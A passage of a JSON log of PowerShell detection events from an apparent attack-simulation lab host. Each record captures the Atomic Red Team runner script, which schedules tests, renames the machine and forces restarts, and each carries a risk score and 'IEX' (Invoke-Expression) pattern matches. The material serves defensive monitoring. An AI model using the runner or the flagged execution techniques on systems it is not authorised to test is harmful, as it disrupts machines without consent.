here\"\n                $retry = $true; $count = 0\n                while ($retry) {\n                    $count = $count + 1\n                    LogRunnerMsg \"Rename retry $count\"\n                    Restart-Computer -Force\n                    Start-Sleep 300;\n                    if ($count -gt 60) { $retry = $false }\n                }\n                exit\n            }\n\n        }\n\n        function Get-TimingVariable ($sched) {\n            $atcount = $sched.Count\n            if ($null -eq $atcount) { $atcount = 1 }\n            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds\n            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds\n            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay\n            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time\n            return $sleeptime\n        }\n\n        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest\n        $htvars = @{}\n        if ($OtherArgs) {\n            $OtherArgs | ForEach-Object {\n                if ($_ -match '^-') {\n                    #New parameter\n                    $lastvar = $_ -replace '^-'\n                    $htvars[$lastvar] = $true\n                }\n                else {\n                    #Value\n                    $htvars[$lastvar] = $_\n                }\n            }\n        }\n        if ($PSBoundParameters.ContainsKey(\"PauseBetweenAtomics\")) {\n            $timeToPause = $PauseBetweenAtomics\n        }\n        else {\n            $timeToPause = $null\n        }\n        $htvars += [Hashtable]$PSBoundParameters\n        $htvars.Remove('listOfAtomics') | Out-Null\n        $htvars.Remove('OtherArgs') | Out-Null\n        $htvars.Remove('PauseBetweenAtomics') | Out-Null\n        $htvars.Remove('scheduledTaskCleanup') | Out-Null\n\n        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)\n\n        # If the schedule is empty, end process\n        if (-not $schedule) {\n            LogRunnerMsg \"No test guid's or enabled tests.\"\n            return\n        }\n\n        # timing variables\n        $SleepTillCleanup = Get-TimingVariable $schedule\n\n        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit\n        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {\n            $schedule | ForEach-Object {\n                Invoke-AtomicTestFromScheduleRow $_\n            }\n            return\n        }\n\n        # exit if file stop.txt is found\n        If (Test-Path $artConfig.stopFile) {\n            LogRunnerMsg \"exiting script because $($artConfig.stopFile) does exist\"\n            Write-Host -ForegroundColor Yellow \"Exiting script because $($artConfig.stopFile) does exist.\"; Start-Sleep 10;\n            exit\n        }\n\n        # Find current test to run\n        $guid = Get-GuidFromHostName $artConfig.basehostname\n        if ([string]::IsNullOrWhiteSpace($guid)) {\n            LogRunnerMsg \"Test Guid ($guid) was null, using next item in the schedule\"\n        }\n        else {\n            if ($artConfig.verbose) { LogRunnerMsg \"Found Test: $guid specified in hostname\" }\n            $sp = [Collections.Generic.List[Object]]$schedule\n            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })\n            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {\n                $tr = $schedule[$currentIndex]\n            }\n\n            if ($null -ne $tr) {\n                if ($scheduledTaskCleanup) {\n                    # Cleanup after running test\n                    Write-Host -Fore cyan \"Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) \"; Start-Sleep -Seconds $SleepTillCleanup\n                    $htvars.Add(\"Cleanup\", $true)\n                    Invoke-AtomicTestFromScheduleRow $tr\n                }\n                else {\n                    # run the atomic test and exit\n                    Invoke-AtomicTestFromScheduleRow $tr\n                    Start-Sleep 3; exit\n                }\n            }\n            else {\n                LogRunnerMsg \"Could not find Test: $guid in schedule. Please update schedule to run this test.\"\n            }\n        }\n\n        # Load next scheduled test before renaming computer\n        $nextIndex += $currentIndex + 1\n        if ($nextIndex -ge ($schedule.count)) {\n            $tr = $schedule[0]\n        }\n        else {\n            $tr = $schedule[$nextIndex]\n        }\n\n        if ($null -eq $tr) {\n            LogRunnerMsg \"Could not determine the next row to execute from the schedule, Starting from 1st row\";\n            $tr = $schedule[0]\n        }\n\n        #Rename Computer and Restart\n        Rename-ThisComputer $tr $artConfig.basehostname\n\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4044585+00:00",
      "event_id": 35710546,
      "risk_score": 3,
      "detected_patterns": ", IEX, Get",
      "pattern_details": "IEX [Score: 2]; Get [Score: 1]",
      "command_length": 9912,
      "full_command": ". \"$PSScriptRoot\\Invoke-RunnerScheduleMethods.ps1\"\n\nfunction Invoke-AtomicRunner {\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $CheckPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $GetPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $Cleanup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false)]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false)]\n        $ListOfAtomics,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $anyOS = $false,\n\n        [parameter(Mandatory = $false)]\n        [ValidateRange(0, [int]::MaxValue)]\n        [int] $PauseBetweenAtomics,\n\n        [parameter(Mandatory = $false)]\n        [switch] $scheduledTaskCleanup,\n\n        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]\n        $OtherArgs\n    )\n    Begin { }\n    Process {\n\n        function Get-GuidFromHostName( $basehostname ) {\n            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + \"-\"), \"\"\n\n            if (!$guid) {\n                LogRunnerMsg \"Hostname has not been updated or could not parse out the Guid: \" + $guid\n                return\n            }\n\n            # Confirm hostname contains a guid\n            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'\n\n            if ($guid -match $guidRegex) { return $guid } else { return \"\" }\n        }\n\n        function Invoke-AtomicTestFromScheduleRow ($tr) {\n            $theArgs = $tr.InputArgs\n            if ($theArgs.GetType().Name -ne \"Hashtable\") {\n                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs\n            }\n            $sc = $tr.AtomicsFolder\n            #Run the Test based on if scheduleContext is 'private' or 'public'\n            if (($sc -eq 'public') -or ($null -eq $sc)) {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            elseif ($sc -eq 'private') {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            if ($timeToPause -gt 0) {\n                Write-Host \"Sleeping for $timeToPause seconds...\"\n                Start-Sleep $timeToPause\n            }\n            elseif ($timeToPause -eq 0) {\n                Write-Host 'Press any key to continue...';\n                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');\n            }\n        }\n\n        function Rename-ThisComputer ($tr, $basehostname) {\n            $hash = $tr.auto_generated_guid\n\n            $newHostName = \"$basehostname-$hash\"\n            $shouldRename = $true\n            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }\n            if ($artConfig.verbose) { LogRunnerMsg \"Setting hostname to $newHostName\" }\n\n            If (Test-Path $artConfig.stopFile) {\n                LogRunnerMsg \"exiting script because $($artConfig.stopFile) exists\"\n                exit\n            }\n\n            if ($IsLinux) {\n                if ($shouldRename) { Invoke-Expression $(\"hostnamectl set-hostname $newHostName\") }\n                Invoke-Expression $(\"shutdown -r now\")\n            }\n            if ($IsMacOS) {\n                if ($shouldRename) {\n                    Invoke-Expression $(\"/usr/sbin/scutil --set HostName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set ComputerName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set LocalHostName $newHostName\")\n                }\n                Invoke-Expression $(\"/sbin/shutdown -r now\")\n            }\n            else {\n                if ($debug) { LogRunnerMsg \"Debug: pretending to rename the computer to $newHostName\"; exit }\n                if (-not $shouldRename) { Restart-Computer -Force }\n                $retry = $true; $count = 0\n                while ($retry) {\n                    Rename-Computer -NewName $newHostName -Force -Restart\n                    Start-Sleep 120; $count = $count + 1\n                    LogRunnerMsg \"Retrying computer rename $count\"\n                    if ($count -gt 60) { $retry = $false }\n                }\n\n                Start-Sleep -seconds 30\n                LogRunnerMsg \"uh oh, still haven't restarted - should never get to here\"\n                $retry = $true; $count = 0\n                while ($retry) {\n                    $count = $count + 1\n                    LogRunnerMsg \"Rename retry $count\"\n                    Restart-Computer -Force\n                    Start-Sleep 300;\n                    if ($count -gt 60) { $retry = $false }\n                }\n                exit\n            }\n\n        }\n\n        function Get-TimingVariable ($sched) {\n            $atcount = $sched.Count\n            if ($null -eq $atcount) { $atcount = 1 }\n            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds\n            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds\n            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay\n            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time\n            return $sleeptime\n        }\n\n        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest\n        $htvars = @{}\n        if ($OtherArgs) {\n            $OtherArgs | ForEach-Object {\n                if ($_ -match '^-') {\n                    #New parameter\n                    $lastvar = $_ -replace '^-'\n                    $htvars[$lastvar] = $true\n                }\n                else {\n                    #Value\n                    $htvars[$lastvar] = $_\n                }\n            }\n        }\n        if ($PSBoundParameters.ContainsKey(\"PauseBetweenAtomics\")) {\n            $timeToPause = $PauseBetweenAtomics\n        }\n        else {\n            $timeToPause = $null\n        }\n        $htvars += [Hashtable]$PSBoundParameters\n        $htvars.Remove('listOfAtomics') | Out-Null\n        $htvars.Remove('OtherArgs') | Out-Null\n        $htvars.Remove('PauseBetweenAtomics') | Out-Null\n        $htvars.Remove('scheduledTaskCleanup') | Out-Null\n\n        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)\n\n        # If the schedule is empty, end process\n        if (-not $schedule) {\n            LogRunnerMsg \"No test guid's or enabled tests.\"\n            return\n        }\n\n        # timing variables\n        $SleepTillCleanup = Get-TimingVariable $schedule\n\n        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit\n        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {\n            $schedule | ForEach-Object {\n                Invoke-AtomicTestFromScheduleRow $_\n            }\n            return\n        }\n\n        # exit if file stop.txt is found\n        If (Test-Path $artConfig.stopFile) {\n            LogRunnerMsg \"exiting script because $($artConfig.stopFile) does exist\"\n            Write-Host -ForegroundColor Yellow \"Exiting script because $($artConfig.stopFile) does exist.\"; Start-Sleep 10;\n            exit\n        }\n\n        # Find current test to run\n        $guid = Get-GuidFromHostName $artConfig.basehostname\n        if ([string]::IsNullOrWhiteSpace($guid)) {\n            LogRunnerMsg \"Test Guid ($guid) was null, using next item in the schedule\"\n        }\n        else {\n            if ($artConfig.verbose) { LogRunnerMsg \"Found Test: $guid specified in hostname\" }\n            $sp = [Collections.Generic.List[Object]]$schedule\n            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })\n            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {\n                $tr = $schedule[$currentIndex]\n            }\n\n            if ($null -ne $tr) {\n                if ($scheduledTaskCleanup) {\n                    # Cleanup after running test\n                    Write-Host -Fore cyan \"Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) \"; Start-Sleep -Seconds $SleepTillCleanup\n                    $htvars.Add(\"Cleanup\", $true)\n                    Invoke-AtomicTestFromScheduleRow $tr\n                }\n                else {\n                    # run the atomic test and exit\n                    Invoke-AtomicTestFromScheduleRow $tr\n                    Start-Sleep 3; exit\n                }\n            }\n            else {\n                LogRunnerMsg \"Could not find Test: $guid in schedule. Please update schedule to run this test.\"\n            }\n        }\n\n        # Load next scheduled test before renaming computer\n        $nextIndex += $currentIndex + 1\n        if ($nextIndex -ge ($schedule.count)) {\n            $tr = $schedule[0]\n        }\n        else {\n            $tr = $schedule[$nextIndex]\n        }\n\n        if ($null -eq $tr) {\n            LogRunnerMsg \"Could not determine the next row to execute from the schedule, Starting from 1st row\";\n            $tr = $schedule[0]\n        }\n\n        #Rename Computer and Restart\n        Rename-ThisComputer $tr $artConfig.basehostname\n\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2007148+00:00",
      "event_id": 35710685,
      "risk_score": 3,
      "detected_patterns": ", IEX, Get",
      "pattern_details": "IEX [Score: 2]; Get [Score: 1]",
      "command_length": 9912,
      "full_command": ". \"$PSScriptRoot\\Invoke-RunnerScheduleMethods.ps1\"\n\nfunction Invoke-AtomicRunner {\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $CheckPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $GetPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $Cleanup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false)]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false)]\n        $ListOfAtomics,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $anyOS = $false,\n\n        [parameter(Mandatory = $false)]\n        [ValidateRange(0, [int]::MaxValue)]\n        [int] $PauseBetweenAtomics,\n\n        [parameter(Mandatory = $false)]\n        [switch] $scheduledTaskCleanup,\n\n        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]\n        $OtherArgs\n    )\n    Begin { }\n    Process {\n\n        function Get-GuidFromHostName( $basehostname ) {\n            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + \"-\"), \"\"\n\n            if (!$guid) {\n                LogRunnerMsg \"Hostname has not been updated or could not parse out the Guid: \" + $guid\n                return\n            }\n\n            # Confirm hostname contains a guid\n            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'\n\n            if ($guid -match $guidRegex) { return $guid } else { return \"\" }\n        }\n\n        function Invoke-AtomicTestFromScheduleRow ($tr) {\n            $theArgs = $tr.InputArgs\n            if ($theArgs.GetType().Name -ne \"Hashtable\") {\n                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs\n            }\n            $sc = $tr.AtomicsFolder\n            #Run the Test based on if scheduleContext is 'private' or 'public'\n            if (($sc -eq 'public') -or ($null -eq $sc)) {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            elseif ($sc -eq 'private') {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            if ($timeToPause -gt 0) {\n                Write-Host \"Sleeping for $timeToPause seconds...\"\n                Start-Sleep $timeToPause\n            }\n            elseif ($timeToPause -eq 0) {\n                Write-Host 'Press any key to continue...';\n                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');\n            }\n        }\n\n        function Rename-ThisComputer ($tr, $basehostname) {\n            $hash = $tr.auto_generated_guid\n\n            $newHostName = \"$basehostname-$hash\"\n            $shouldRename = $true\n            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }\n            if ($artConfig.verbose) { LogRunnerMsg \"Setting hostname to $newHostName\" }\n\n            If (Test-Path $artConfig.stopFile) {\n                LogRunnerMsg \"exiting script because $($artConfig.stopFile) exists\"\n                exit\n            }\n\n            if ($IsLinux) {\n                if ($shouldRename) { Invoke-Expression $(\"hostnamectl set-hostname $newHostName\") }\n                Invoke-Expression $(\"shutdown -r now\")\n            }\n            if ($IsMacOS) {\n                if ($shouldRename) {\n                    Invoke-Expression $(\"/usr/sbin/scutil --set HostName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set ComputerName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set LocalHostName $newHostName\")\n                }\n                Invoke-Expression $(\"/sbin/shutdown -r now\")\n            }\n            else {\n                if ($debug) { LogRunnerMsg \"Debug: pretending to rename the computer to $newHostName\"; exit }\n                if (-not $shouldRename) { Restart-Computer -Force }\n                $retry = $true; $count = 0\n                while ($retry) {\n                    Rename-Computer -NewName $newHostName -Force -Restart\n                    Start-Sleep 120; $count = $count + 1\n                    LogRunnerMsg \"Retrying computer rename $count\"\n                    if ($count -gt 60) { $retry = $false }\n                }\n\n                Start-Sleep -seconds 30\n                LogRunnerMsg \"uh oh, still haven't restarted - should never get to here\"\n                $retry = $true; $count = 0\n                while ($retry) {\n                    $count = $count + 1\n                    LogRunnerMsg \"Rename retry $count\"\n                    Restart-Computer -Force\n                    Start-Sleep 300;\n                    if ($count -gt 60) { $retry = $false }\n                }\n                exit\n            }\n\n        }\n\n        function Get-TimingVariable ($sched) {\n            $atcount = $sched.Count\n            if ($null -eq $atcount) { $atcount = 1 }\n            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds\n            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds\n            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay\n            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time\n            return $sleeptime\n        }\n\n        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest\n        $htvars = @{}\n        if ($OtherArgs) {\n            $OtherArgs | ForEach-Object {\n                if ($_ -match '^-') {\n                    #New parameter\n                    $lastvar = $_ -replace '^-'\n                    $htvars[$lastvar] = $true\n                }\n                else {\n                    #Value\n                    $htvars[$lastvar] = $_\n                }\n            }\n        }\n        if ($PSBoundParameters.ContainsKey(\"PauseBetweenAtomics\")) {\n            $timeToPause = $PauseBetweenAtomics\n        }\n        else {\n            $timeToPause = $null\n        }\n        $htvars += [Hashtable]$PSBoundParameters\n        $htvars.Remove('listOfAtomics') | Out-Null\n        $htvars.Remove('OtherArgs') | Out-Null\n        $htvars.Remove('PauseBetweenAtomics') | Out-Null\n        $htvars.Remove('scheduledTaskCleanup') | Out-Null\n\n        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)\n\n        # If the schedule is empty, end process\n        if (-not $schedule) {\n            LogRunnerMsg \"No test guid's or enabled tests.\"\n            return\n        }\n\n        # timing variables\n        $SleepTillCleanup = Get-TimingVariable $schedule\n\n        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit\n        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {\n            $schedule | ForEach-Object {\n                Invoke-AtomicTestFromScheduleRow $_\n            }\n            return\n        }\n\n        # exit if file stop.txt is found\n        If (Test-Path $artConfig.stopFile) {\n            LogRunnerMsg \"exiting script because $($artConfig.stopFile) does exist\"\n            Write-Host -ForegroundColor Yellow \"Exiting script because $($artConfig.stopFile) does exist.\"; Start-Sleep 10;\n            exit\n        }\n\n        # Find current test to run\n        $guid = Get-GuidFromHostName $artConfig.basehostname\n        if ([string]::IsNullOrWhiteSpace($guid)) {\n            LogRunnerMsg \"Test Guid ($guid) was null, using next item in the schedule\"\n        }\n        else {\n            if ($artConfig.verbose) { LogRunnerMsg \"Found Test: $guid specified in hostname\" }\n            $sp = [Collections.Generic.List[Object]]$schedule\n            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })\n            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {\n                $tr = $schedule[$currentIndex]\n            }\n\n            if ($null -ne $tr) {\n                if ($scheduledTaskCleanup) {\n                    # Cleanup after running test\n                    Write-Host -Fore cyan \"Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) \"; Start-Sleep -Seconds $SleepTillCleanup\n                    $htvars.Add(\"Cleanup\", $true)\n                    Invoke-AtomicTestFromScheduleRow $tr\n                }\n                else {\n                    # run the atomic test and exit\n                    Invoke-AtomicTestFromScheduleRow $tr\n                    Start-Sleep 3; exit\n                }\n            }\n            else {\n                LogRunnerMsg \"Could not find Test: $guid in schedule. Please update schedule to run this test.\"\n            }\n        }\n\n        # Load next scheduled test before renaming computer\n        $nextIndex += $currentIndex + 1\n        if ($nextIndex -ge ($schedule.count)) {\n            $tr = $schedule[0]\n        }\n        else {\n            $tr = $schedule[$nextIndex]\n        }\n\n        if ($null -eq $tr) {\n            LogRunnerMsg \"Could not determine the next row to execute from the schedule, Starting from 1st row\";\n            $tr = $schedule[0]\n        }\n\n        #Rename Computer and Restart\n        Rename-ThisComputer $tr $artConfig.basehostname\n\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'\nPattern 'IEX' matched: 'Invoke-Expression'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.0797861+00:00",
      "event_id": 35710876,
      "risk_score": 3,
      "detected_patterns": ", IEX, Get",
      "pattern_details": "IEX [Score: 2]; Get [Score: 1]",
      "command_length": 9912,
      "full_command": ". \"$PSScriptRoot\\Invoke-RunnerScheduleMethods.ps1\"\n\nfunction Invoke-AtomicRunner {\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $CheckPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $GetPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $Cleanup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false)]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false)]\n        $ListOfAtomics,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $anyOS = $false,\n\n        [parameter(Mandatory = $false)]\n        [ValidateRange(0, [int]::MaxValue)]\n        [int] $PauseBetweenAtomics,\n\n        [parameter(Mandatory = $false)]\n        [switch] $scheduledTaskCleanup,\n\n        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]\n        $OtherArgs\n    )\n    Begin { }\n    Process {\n\n        function Get-GuidFromHostName( $basehostname ) {\n            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + \"-\"), \"\"\n\n            if (!$guid) {\n                LogRunnerMsg \"Hostname has not been updated or could not parse out the Guid: \" + $guid\n                return\n            }\n\n            # Confirm hostname contains a guid\n            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'\n\n            if ($guid -match $guidRegex) { return $guid } else { return \"\" }\n        }\n\n        function Invoke-AtomicTestFromScheduleRow ($tr) {\n            $theArgs = $tr.InputArgs\n            if ($theArgs.GetType().Name -ne \"Hashtable\") {\n                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs\n            }\n            $sc = $tr.AtomicsFolder\n            #Run the Test based on if scheduleContext is 'private' or 'public'\n            if (($sc -eq 'public') -or ($null -eq $sc)) {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            elseif ($sc -eq 'private') {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            if ($timeToPause -gt 0) {\n                Write-Host \"Sleeping for $timeToPause seconds...\"\n                Start-Sleep $timeToPause\n            }\n            elseif ($timeToPause -eq 0) {\n                Write-Host 'Press any key to continue...';\n                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');\n            }\n        }\n\n        function Rename-ThisComputer ($tr, $basehostname) {\n            $hash = $tr.auto_generated_guid\n\n            $newHostName = \"$basehostname-$hash\"\n            $shouldRename = $true\n            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }\n            if ($artConfig.verbose) { LogRunnerMsg \"Setting hostname to $newHostName\" }\n\n            If (Test-Path $artConfig.stopFile) {\n                LogRunnerMsg \"exiting script because $($artConfig.stopFile) exists\"\n                exit\n            }\n\n            if ($IsLinux) {\n                if ($shouldRename) { Invoke-Expression $(\"hostnamectl set-hostname $newHostName\") }\n                Invoke-Expression $(\"shutdown -r now\")\n            }\n            if ($IsMacOS) {\n                if ($shouldRename) {\n                    Invoke-Expression $(\"/usr/sbin/scutil --set HostName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set ComputerName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set LocalHostName $newHostName\")\n                }\n                Invoke-Expression $(\"/sbin/shutdown -r now\")\n            }\n            else {\n                if ($debug) { LogRunnerMsg \"Debug: pretending to rename the computer to $newHostName\"; exit }\n                if (-not $shouldRename) { Restart-Computer -Force }\n                $retry = $true; $count = 0\n                while ($retry) {\n                    Rename-Computer -NewName $newHostName -Force -Restart\n                    Start-Sleep 120; $count = $count + 1\n                    LogRunnerMsg \"Retrying computer rename $count\"\n                    if ($count -gt 60) { $retry = $false }\n                }\n\n                Start-Sleep -seconds 30\n                LogRunnerMsg \"uh oh, still haven't restarted - should never get to here\"\n                $retry = $true; $count = 0\n                while ($retry) {\n                    $count = $count + 1\n                    LogRunnerMsg \"Rename retry $count\"\n                    Restart-Computer -Force\n                    Start-Sleep 300;\n                    if ($count -gt 60) { $retry = $false }\n                }\n                exit\n            }\n\n        }\n\n        function Get-TimingVariable ($sched) {\n            $atcount = $sched.Count\n            if ($null -eq $atcount) { $atcount = 1 }\n            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds\n            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds\n            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay\n            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time\n            return $sleeptime\n        }\n\n        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest\n        $htvars = @{}\n        if ($OtherArgs) {\n            $OtherArgs | ForEach-Object {\n                if ($_ -match '^-') {\n                    #New parameter\n                    $lastvar = $_ -replace '^-'\n                    $htvars[$lastvar] = $true\n                }\n                else {\n                    #Value\n                    $htvars[$lastvar] = $_\n                }\n            }\n        }\n        if ($PSBoundParameters.ContainsKey(\"PauseBetweenAtomics\")) {\n            $timeToPause = $PauseBetweenAtomics\n        }\n        else {\n            $timeToPause = $null\n        